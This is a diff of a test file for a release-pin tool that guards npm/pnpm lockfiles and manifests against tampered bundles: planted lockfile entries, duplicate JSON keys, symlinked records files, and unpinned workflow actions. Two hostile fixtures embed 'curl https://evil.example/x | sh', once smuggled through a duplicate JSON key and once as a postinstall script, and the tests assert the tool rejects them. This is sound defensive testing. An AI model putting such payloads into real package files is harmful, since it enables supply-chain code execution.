@@ -376,7 +376,7 @@ test('the push job commits a checked bundle on the head it was pinned on, and no
   const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
   writeFileSync(path.join(src, 'package.json'), `${JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }, null, 2)}\n`);
   writeFileSync(path.join(src, 'package-lock.json'), `${npmLock('1.4.0-rl.7.3', ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3'), 'sha512-new')}\n`);
-  writeFileSync(path.join(src, '.release-pins.json'), `${JSON.stringify({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } })}\n`);
+  writeFileSync(path.join(src, '.release-pins.json'), `${JSON.stringify({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } }, null, 2)}\n`);
   const bundle = path.join(work, 'bundle');
   writeBundle(src, { release: 'RL-7', pins, files: ['.release-pins.json', 'package-lock.json', 'package.json'] }, bundle, tip);
 
@@ -1002,10 +1002,10 @@ test('an entry at the pin that the branch held and nothing depended on is checke
   assert.equal(check(''), null, 'as the registry publishes it');
   assert.equal(check('\n      zod: 4.0.0'), null);
   // The reviewer's input: an undeclared dependency and a version out of the registry's range.
-  assert.match(check('\n      drizzle-orm: 0.45.2\n      zod: 3.0.0'), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which no importer on the branch reached, depends on drizzle-orm, which the registry does not list/);
-  assert.match(check('\n      zod: 3.0.0'), /which no importer on the branch reached, depends on zod at 3\.0\.0, which is neither the branch's only snapshot of it nor in the registry's range/);
+  assert.match(check('\n      drizzle-orm: 0.45.2\n      zod: 3.0.0'), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which the branch already had, depends on drizzle-orm, which the registry does not list/);
+  assert.match(check('\n      zod: 3.0.0'), /which the branch already had, depends on zod at 3\.0\.0, which is neither the branch's only snapshot of it nor in the registry's range/);
   assert.match(check('\n    optional: true'), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\) is optional, which the lockfile's dependencies do not explain/);
-  assert.match(check('', '\n    requiresBuild: true'), /packages @revt-eng\/sdk@1\.4\.0, which no importer on the branch reached, has requiresBuild, which pnpm does not write on a package/);
+  assert.match(check('', '\n    requiresBuild: true'), /packages @revt-eng\/sdk@1\.4\.0, which the branch already had, has requiresBuild, which pnpm does not write on a package/);
   // An entry at the pin that the branch was already using is the branch's: the same pin dispatched again changes nothing.
   assert.equal(peerRefusal(peerAfter(), peerAfter()), null);
 });
@@ -1034,27 +1034,38 @@ test('.release-pins.json: a record is the range a prerelease pin replaced, and g
   assert.match(pinRecordsRefusal(held, null, final, atHead), /changes the record of @revt-eng\/core, which is not being pinned/);
 });
 
-// Fifth review: a final pin that deletes .release-pins.json commits against a bare repository; an entry at the pin is
-// held to the new-entry rules unless an importer of the branch reaches it; the records a bundle leaves are exactly the
-// ones apply leaves.
+// Fifth and sixth reviews: a final pin that deletes .release-pins.json commits against a bare repository; every entry
+// at the pin is held to the new-entry rules, whatever the branch did with it; the records a bundle leaves are exactly
+// the bytes apply writes; a manifest is the branch's text with only the pinned specifiers replaced.
 import * as fsR5 from 'node:fs';
 import osR5 from 'node:os';
 import pathR5 from 'node:path';
 import { execFileSync as execR5 } from 'node:child_process';
-import { apply as applyR5, commitBundle as commitR5, lockGraph as lockGraphR5, parsePnpmLock as parseLockR5, pnpmLockRefusal as lockRefusalR5, writeBundle as writeBundleR5 } from '../scripts/release-pin.mjs';
+import { apply as applyR5, commitBundle as commitR5, pnpmLockRefusal as lockRefusalR5, writeBundle as writeBundleR5 } from '../scripts/release-pin.mjs';
 
 const idR5 = { GIT_AUTHOR_NAME: 'pin', GIT_AUTHOR_EMAIL: 'pin@example.com', GIT_COMMITTER_NAME: 'pin', GIT_COMMITTER_EMAIL: 'pin@example.com' };
 const jsonR5 = (value) => `${JSON.stringify(value, null, 2)}\n`;
 const PINS_R5 = '.release-pins.json';
-/** A Release branch head with these files, its bare clone (all the push job has) and the work tree the pin job pins in. */
-function branchR5(files) {
+/**
+ * A Release branch head with these files (a string as written, anything else as two-space JSON; `specials` are index
+ * entries [mode, content]: a symlink's target, a gitlink's commit), its bare clone (all the push job has) and the work
+ * tree the pin job pins in.
+ */
+function branchR5(files, specials = {}) {
   const work = fsR5.mkdtempSync(pathR5.join(osR5.tmpdir(), 'release-pin-r5-'));
   const src = pathR5.join(work, 'src'), bare = pathR5.join(work, 'bare.git');
   const run = (cwd, args, input) => execR5('git', args, { cwd, input, encoding: 'utf8', env: { ...process.env, ...idR5 } });
   fsR5.mkdirSync(src);
   run(src, ['init', '-q', '-b', 'release/RL-7']);
-  for (const [file, value] of Object.entries(files)) fsR5.writeFileSync(pathR5.join(src, file), jsonR5(value));
+  for (const [file, value] of Object.entries(files)) {
+    fsR5.mkdirSync(pathR5.dirname(pathR5.join(src, file)), { recursive: true });
+    fsR5.writeFileSync(pathR5.join(src, file), typeof value === 'string' ? value : jsonR5(value));
+  }
   run(src, ['add', '-A']);
+  for (const [file, [mode, content]] of Object.entries(specials)) {
+    const object = mode === '160000' ? content : run(src, ['hash-object', '-w', '--stdin'], content).trim();
+    run(src, ['update-index', '--add', '--cacheinfo', `${mode},${object},${file}`]);
+  }
   run(src, ['-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'head']);
   const tip = run(src, ['rev-parse', 'HEAD']).trim();
   run(work, ['clone', '-q', '--bare', src, bare]);
@@ -1124,7 +1135,7 @@ test('the records a bundle leaves are exactly the ones apply leaves: none missin
     fsR5.writeFileSync(pathR5.join(dir, 'files', PINS_R5), '{}\n');
     const manifest = listedR5(dir);
     fsR5.writeFileSync(pathR5.join(dir, 'manifest.json'), JSON.stringify({ ...manifest, files: manifest.files.map((entry) => ({ ...entry, deleted: false })) }));
-  }).commit, /is left with no record; the pin that removes the last record deletes the file/);
+  }).commit, /is left with no record; the pin that leaves no record deletes the file/);
   // The final pin of one package leaves the other package's record, and only that.
   const two = () => branchR5({ 'package.json': { name: 'x', dependencies: { '@revt-eng/core': '0.1.5-rl.7.1', '@revt-eng/sdk': '1.4.0-rl.7.3' } }, [PINS_R5]: { 'package.json': { '@revt-eng/core': '^0.1.0', '@revt-eng/sdk': '^1.3.0' } } });
   assert.throws(bundleR5(two(), '1.4.0', (dir) => fsR5.writeFileSync(pathR5.join(dir, 'files', PINS_R5), jsonR5({ 'package.json': { '@revt-eng/core': '^0.1.0', '@revt-eng/sdk': '^1.3.0' } }))).commit, /keeps a record of @revt-eng\/sdk/);
@@ -1138,11 +1149,11 @@ test('the records a bundle leaves are exactly the ones apply leaves: none missin
 /** The fourth review's lockfile: the branch head may carry @revt-eng/sdk@1.4.0's entries already, unused. */
 const shaR5 = (seed) => `sha512-${seed}AAAA==`;
 const ghR5 = (name, version) => `https://npm.pkg.github.com/download/${name}/${version}/abc123`;
-const lockR5 = ({ sdk = '1.3.0', integrity = shaR5('old'), extraPkg = [], extraSnap = [], tail = [] } = {}) => [
+const lockR5 = ({ sdk = '1.3.0', integrity = shaR5('old'), extraImp = [], extraImporters = [], extraPkg = [], extraSnap = [], tail = [] } = {}) => [
   "lockfileVersion: '9.0'", '', 'settings:', '  autoInstallPeers: true', '', 'importers:', '', '  .:', '    dependencies:',
   "      '@revt-eng/sdk':", `        specifier: ${sdk}`, `        version: ${sdk}(react@19.2.7)`,
   '      react:', '        specifier: 19.2.7', '        version: 19.2.7',
-  '      zod:', '        specifier: 4.0.0', '        version: 4.0.0', '', 'packages:', '',
+  '      zod:', '        specifier: 4.0.0', '        version: 4.0.0', ...extraImp, '', ...extraImporters, 'packages:', '',
   `  '@revt-eng/sdk@${sdk}':`, `    resolution: {integrity: ${integrity}, tarball: ${ghR5('@revt-eng/sdk', sdk)}}`, '    peerDependencies:', "      react: '>=19'", '', ...extraPkg,
   '  left-pad@1.0.0:', `    resolution: {integrity: ${shaR5('lp')}}`, '',
   '  react@19.2.7:', `    resolution: {integrity: ${shaR5('react')}}`, '',
@@ -1161,24 +1172,128 @@ const plantedR5 = (edges, tail = []) => lockR5({
   extraSnap: ["  '@revt-eng/sdk@1.4.0(react@19.2.7)':", '    dependencies:', ...edges, ''], tail,
 });
 
-test('an entry at the pin is the pin\'s unless an importer of the branch reaches it, whatever else names it', () => {
+test('an entry at the pin that the branch already had is held to the new-entry rules, whatever else names it', () => {
   const check = (head) => lockRefusalR5('pnpm-lock.yaml', head, movedR5(head), pinsR5, registryR5);
   assert.equal(lockRefusalR5('pnpm-lock.yaml', lockR5(), lockR5({ sdk: '1.4.0', integrity: shaR5('new') }), pinsR5, registryR5), null, 'the pin as pnpm writes it');
-  assert.equal(check(plantedR5(['      react: 19.2.7', '      zod: 4.0.0'])), null, 'an unused entry at the pin, as the registry publishes it');
+  assert.equal(check(plantedR5(['      react: 19.2.7', '      zod: 4.0.0'])), null, 'an entry at the pin the branch had, as the registry publishes it');
   const evil = ['      left-pad: 1.0.0', '      react: 19.2.7', '      zod: 3.0.0'];
-  const reached = /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which no importer on the branch reached, depends on left-pad, which the registry does not list/;
-  assert.match(String(check(plantedR5(evil))), reached, 'nothing names it');
-  // The reviewer's variants: another unused snapshot of the head names it, or it names itself.
+  const held = /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which the branch already had, depends on left-pad, which the registry does not list/;
+  assert.match(String(check(plantedR5(evil))), held, 'nothing names it');
+  // The fifth review's variants: another unused snapshot of the head names it, or it names itself.
   const decoy = plantedR5(evil, ['    dependencies:', "      '@revt-eng/sdk': 1.4.0(react@19.2.7)", '    optional: true']);
-  assert.match(String(check(decoy)), reached, 'an unused snapshot names it');
+  assert.match(String(check(decoy)), held, 'an unused snapshot names it');
   const self = plantedR5(['      left-pad: 1.0.0', "      '@revt-eng/sdk': 1.4.0(react@19.2.7)", '      react: 19.2.7', '      zod: 3.0.0']);
-  assert.match(String(check(self)), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which no importer on the branch reached/, 'it names itself');
-  // What the graph says: referenced, and not reachable from an importer.
-  const parsed = parseLockR5(decoy).lock;
-  const graph = lockGraphR5(parsed.get('importers'), parsed.get('snapshots'));
-  assert.equal(graph.referenced.has('@revt-eng/sdk@1.4.0(react@19.2.7)'), true);
-  assert.equal(graph.reachable.has('@revt-eng/sdk@1.4.0(react@19.2.7)'), false);
-  assert.equal(graph.reachable.has('@revt-eng/sdk@1.3.0(react@19.2.7)'), true);
-  assert.equal(graph.reachable.has('zod@4.0.0'), true);
-  assert.equal(graph.reachable.has('left-pad@1.0.0'), false);
+  assert.match(String(check(self)), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which the branch already had/, 'it names itself');
+});
+
+// Sixth review (probes lk.mjs, cb.mjs, c10.mjs): reachability is no reason to trust an entry at the pin; JSON is
+// compared as text; the records file is the bytes apply writes; only a regular file is ever the records.
+import { duplicateJsonKey as duplicateKeyR6, npmLockRefusal as npmRefusalR6, substituteSpecifiers as substituteR6 } from '../scripts/release-pin.mjs';
+
+test('sixth review: an entry at the pin is checked even where the branch reaches it (skipped optional, ghost importer, alias, workspace)', () => {
+  const sdkPkg = ["  '@revt-eng/sdk@1.4.0':", `    resolution: {integrity: ${shaR5('new')}, tarball: ${ghR5('@revt-eng/sdk', '1.4.0')}}`, '    peerDependencies:', "      react: '>=19'", ''];
+  const evil = ["  '@revt-eng/sdk@1.4.0(react@19.2.7)':", '    dependencies:', '      left-pad: 1.0.0', '      react: 19.2.7', '      zod: 3.0.0', ''];
+  const good = ["  '@revt-eng/sdk@1.4.0(react@19.2.7)':", '    dependencies:', '      react: 19.2.7', '      zod: 4.0.0', ''];
+  const held = /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which the branch already had, depends on left-pad, which the registry does not list/;
+  const check = (head, after = movedR5(head)) => String(lockRefusalR5('pnpm-lock.yaml', head, after, pinsR5, registryR5));
+  const unflag = (text, key) => text.replace(`  ${key}:\n    optional: true\n`, `  ${key}: {}\n`);
+  // R2: reached only through fsevents (os: [darwin], an optional dependency pnpm skips on Linux); the pin makes it required.
+  const fsevents = ['  fsevents@2.3.3:', `    resolution: {integrity: ${shaR5('fse')}}`, '    os: [darwin]', ''];
+  const skipped = (field) => lockR5({
+    extraImp: ['    optionalDependencies:', '      fsevents:', '        specifier: 2.3.3', '        version: 2.3.3'],
+    extraPkg: [...sdkPkg, ...fsevents],
+    extraSnap: [...evil.slice(0, -1), '    optional: true', '', '  fsevents@2.3.3:', `    ${field}:`, "      '@revt-eng/sdk': 1.4.0(react@19.2.7)", '    optional: true', ''],
+  });
+  for (const field of ['dependencies', 'optionalDependencies']) {
+    const head = skipped(field);
+    const after = unflag(unflag(movedR5(head).replace('      zod: 3.0.0\n    optional: true\n', '      zod: 3.0.0\n'), 'left-pad@1.0.0'), 'zod@3.0.0');
+    assert.match(check(head, after), held, `R2 via fsevents' ${field}`);
+  }
+  // R3: reached only from an importer that is no workspace project.
+  const ghost = ['  ghost:', '    dependencies:', "      '@revt-eng/sdk':", '        specifier: 1.4.0', '        version: 1.4.0(react@19.2.7)', ''];
+  const inUse = (options) => lockR5({ ...options, extraPkg: sdkPkg, extraSnap: evil, tail: ['    {}'] })
+    .replace('  left-pad@1.0.0:\n    {}', '  left-pad@1.0.0: {}').replace('  zod@3.0.0:\n    optional: true', '  zod@3.0.0: {}');
+  assert.match(check(inUse({ extraImporters: ghost })), held, 'R3 a ghost importer');
+  // R5, R6: reached through an npm: alias, or from another workspace project: in use, and still held to the registry.
+  assert.match(check(inUse({ extraImp: ['      sdk2:', '        specifier: npm:@revt-eng/sdk@1.4.0', "        version: '@revt-eng/sdk@1.4.0(react@19.2.7)'"] })), held, 'R5 an alias');
+  const sibling = ['  packages/sib:', '    dependencies:', "      '@revt-eng/sdk':", '        specifier: 1.4.0', '        version: 1.4.0(react@19.2.7)', ''];
+  assert.match(check(inUse({ extraImp: ['      sib:', '        specifier: workspace:*', '        version: link:packages/sib'], extraImporters: sibling })), held, 'R6 a workspace project');
+  // Control: another project already uses the genuine entry at the pin; the pin moves `.` onto it.
+  const b = ['  b:', '    dependencies:', "      '@revt-eng/sdk':", '        specifier: 1.4.0', '        version: 1.4.0(react@19.2.7)', ''];
+  const shared = lockR5({ extraImporters: b, extraPkg: sdkPkg, extraSnap: good });
+  assert.equal(lockRefusalR5('pnpm-lock.yaml', shared, movedR5(shared), pinsR5, registryR5), null);
+});
+
+/** A bundle written by hand (what a compromised pin job could upload), and the push job's commit of it. */
+function hostileR5(branch, version, entries) {
+  const pins = [{ name: '@revt-eng/sdk', version }];
+  const bundle = fsR5.mkdtempSync(pathR5.join(branch.work, 'hostile-'));
+  fsR5.mkdirSync(pathR5.join(bundle, 'files'));
+  for (const entry of entries) if (entry.text !== undefined) fsR5.writeFileSync(pathR5.join(bundle, 'files', entry.path), entry.text);
+  fsR5.writeFileSync(pathR5.join(bundle, 'manifest.json'), JSON.stringify({ release: 'RL-7', base: branch.tip, pins, files: entries.map((entry) => ({ path: entry.path, deleted: Boolean(entry.deleted) })) }));
+  return () => commitR5({ bundle, tip: branch.tip, pins, release: 'RL-7', n: 7, git: branch.git });
+}
+const sdkManifestR6 = (spec, extra = {}) => jsonR5({ name: 'x', dependencies: { '@revt-eng/sdk': spec }, ...extra });
+
+test('sixth review: .release-pins.json is exactly the bytes apply writes, and only ever a regular file', { timeout: 120_000 }, () => {
+  const PRE = '1.4.0-rl.7.3';
+  const overRange = () => branchR5({ 'package.json': sdkManifestR6('^1.3.0') });
+  const asApply = jsonR5({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } });
+  assert.match(hostileR5(overRange(), PRE, [{ path: PINS_R5, text: asApply }, { path: 'package.json', text: sdkManifestR6(PRE) }])().sha, /^[0-9a-f]{40}$/, 'C0, as apply writes it');
+  const bytes = /is not exactly the bytes apply writes for its records/;
+  // C1: a duplicate key whose first copy carries a payload; C2: empty record objects for other paths.
+  assert.throws(hostileR5(overRange(), PRE, [{ path: PINS_R5, text: '{"package.json":{"@revt-eng/sdk":"curl https://evil.example/x | sh"},"package.json":{"@revt-eng/sdk":"^1.3.0"}}' }, { path: 'package.json', text: sdkManifestR6(PRE) }]), bytes);
+  assert.throws(hostileR5(overRange(), PRE, [{ path: PINS_R5, text: jsonR5({ 'package.json': { '@revt-eng/sdk': '^1.3.0' }, 'docs/package.json': {}, 'nope/package.json': {} }) }, { path: 'package.json', text: sdkManifestR6(PRE) }]), bytes);
+  // C6b: the right records, minified.
+  const two = () => branchR5({ 'package.json': { name: 'x', dependencies: { '@revt-eng/core': '0.1.5-rl.7.1', '@revt-eng/sdk': PRE } }, [PINS_R5]: { 'package.json': { '@revt-eng/core': '^0.1.0', '@revt-eng/sdk': '^1.3.0' } } });
+  const restored = jsonR5({ name: 'x', dependencies: { '@revt-eng/core': '0.1.5-rl.7.1', '@revt-eng/sdk': '^1.4.0' } });
+  assert.throws(hostileR5(two(), '1.4.0', [{ path: PINS_R5, text: '{"package.json":{"@revt-eng/core":"^0.1.0"}}' }, { path: 'package.json', text: restored }]), bytes);
+  assert.match(hostileR5(two(), '1.4.0', [{ path: PINS_R5, text: jsonR5({ 'package.json': { '@revt-eng/core': '^0.1.0' } }) }, { path: 'package.json', text: restored }])().sha, /^[0-9a-f]{40}$/);
+  // D2, D3, D4: a symlink, a gitlink or a directory at .release-pins.json on the branch.
+  const finalBundle = [{ path: PINS_R5, deleted: true }, { path: 'package.json', text: sdkManifestR6('^1.4.0') }];
+  const atPrerelease = { 'package.json': sdkManifestR6(PRE) };
+  assert.throws(hostileR5(branchR5(atPrerelease, { [PINS_R5]: ['120000', '{"package.json":{"@revt-eng/sdk":"^1.3.0"}}'] }), '1.4.0', finalBundle), /\.release-pins\.json on the branch is not a regular file \(120000\)/);
+  assert.throws(hostileR5(branchR5({ 'package.json': sdkManifestR6('^1.3.0') }, { [PINS_R5]: ['160000', '0123456789abcdef0123456789abcdef01234567'] }), PRE, [{ path: PINS_R5, text: asApply }, { path: 'package.json', text: sdkManifestR6(PRE) }]), /not a regular file \(160000\)/);
+  assert.throws(hostileR5(branchR5({ 'package.json': sdkManifestR6('^1.3.0'), [`${PINS_R5}/inner.txt`]: 'x\n' }), PRE, [{ path: PINS_R5, text: asApply }, { path: 'package.json', text: sdkManifestR6(PRE) }]), /not a regular file \(040000\)/);
+  // C10: an empty {} on the branch goes with the next pin; apply deletes it, and a bundle that keeps it is refused.
+  const empty = () => branchR5({ 'package.json': sdkManifestR6('1.3.0'), [PINS_R5]: '{}\n' });
+  assert.throws(hostileR5(empty(), PRE, [{ path: 'package.json', text: sdkManifestR6(PRE) }]), /is left with no record/);
+  const emptied = empty(), pinned = bundleR5(emptied, PRE);
+  assert.deepEqual(pinned.result.files, [PINS_R5, 'package.json']);
+  assert.equal(emptied.git(['ls-tree', '--name-only', pinned.commit().sha]).trim(), 'package.json');
+});
+
+test('sixth review: package.json is the branch\'s text with only the pinned specifiers replaced; package-lock.json is npm\'s text', { timeout: 120_000 }, () => {
+  const PRE = '1.4.0-rl.7.3';
+  const head = () => branchR5({ 'package.json': sdkManifestR6('^1.3.0', { scripts: { build: 'tsc' } }) });
+  const records = { path: PINS_R5, text: jsonR5({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } }) };
+  // M1: a duplicate "scripts" whose first copy is a postinstall; M2: the same values reformatted, with an escape.
+  assert.throws(hostileR5(head(), PRE, [records, { path: 'package.json', text: `{"name":"x","scripts":{"postinstall":"curl https://evil.example/x | sh"},"dependencies":{"@revt-eng/sdk":"${PRE}"},"scripts":{"build":"tsc"}}\n` }]), /has the key "scripts" twice in one object/);
+  assert.throws(hostileR5(head(), PRE, [records, { path: 'package.json', text: `{\n\t"dependencies": {"@revt-eng/sdk": "${PRE}"},\n\t"scripts": {"build": "\\u0074sc"},\n\t"name": "x"\n}` }]), /is not the branch's file with only the pinned specifiers replaced/);
+  assert.match(hostileR5(head(), PRE, [records, { path: 'package.json', text: sdkManifestR6(PRE, { scripts: { build: 'tsc' } }) }])().sha, /^[0-9a-f]{40}$/);
+  // The substitution: in place, byte for byte elsewhere, and only where the pair is in the text once.
+  const odd = '{\n    "dependencies" : { "@revt-eng/sdk" :"^1.3.0" },  "files": ["a", "b"]\n}\n';
+  assert.equal(substituteR6(odd, [{ name: '@revt-eng/sdk', from: '^1.3.0', to: PRE }]), odd.replace('"^1.3.0"', `"${PRE}"`));
+  assert.equal(substituteR6('{"dependencies":{"@revt-eng/sdk":"^1.3.0"},"peerDependencies":{"@revt-eng/sdk":"^1.3.0"}}', [{ name: '@revt-eng/sdk', from: '^1.3.0', to: PRE }]), null);
+  assert.equal(substituteR6('{"dependencies":{"@revt-eng/sdk":"\\u005e1.3.0"}}', [{ name: '@revt-eng/sdk', from: '^1.3.0', to: PRE }]), null);
+  assert.equal(duplicateKeyR6('{"a":{"b":1,"c":"b"},"d":[{"b":1},{"b":2}],"e":"{\\"a\\":1}"}'), null);
+  assert.equal(duplicateKeyR6('{"a":{"b":1,"b":2}}'), 'b');
+  // package-lock.json: what npm writes passes; a duplicate key or a reformat does not.
+  const lock = (spec, version, integrity) => ({ name: 'x', lockfileVersion: 3, requires: true, packages: {
+    '': { name: 'x', dependencies: { '@revt-eng/sdk': spec } },
+    'node_modules/@revt-eng/sdk': { version, resolved: ghR5('@revt-eng/sdk', version), integrity },
+  } });
+  const npmPins = [{ name: '@revt-eng/sdk', version: PRE }];
+  const npmRegistry = new Map([['@revt-eng/sdk', { [PRE]: { integrity: shaR5('pre'), tarball: ghR5('@revt-eng/sdk', PRE) } }]]);
+  const before = jsonR5(lock('^1.3.0', '1.3.0', shaR5('old'))), after = jsonR5(lock(PRE, PRE, shaR5('pre')));
+  assert.equal(npmRefusalR6('package-lock.json', before, after, npmPins, npmRegistry), null);
+  assert.match(String(npmRefusalR6('package-lock.json', before, after.replace('"name": "x",', '"name": "evil",\n  "name": "x",'), npmPins, npmRegistry)), /has the key "name" twice in one object/);
+  assert.match(String(npmRefusalR6('package-lock.json', before, `${JSON.stringify(JSON.parse(after))}\n`, npmPins, npmRegistry)), /is not written as npm writes it/);
+});
+
+test('sixth review: the pin workflows use every action at a full commit sha', () => {
+  for (const file of ['.github/workflows/release-pin.yml', '.github/workflows/release-pin-attempt.yml']) {
+    const text = fsR5.readFileSync(pathR5.join(process.cwd(), file), 'utf8');
+    for (const [, ref] of text.matchAll(/^\s*-?\s*uses:\s*([^\s#]+)/gm)) if (!ref.startsWith('./')) assert.match(ref, /^[\w.-]+\/[\w.-]+@[0-9a-f]{40}$/, `${file}: ${ref}`);
+  }
 });
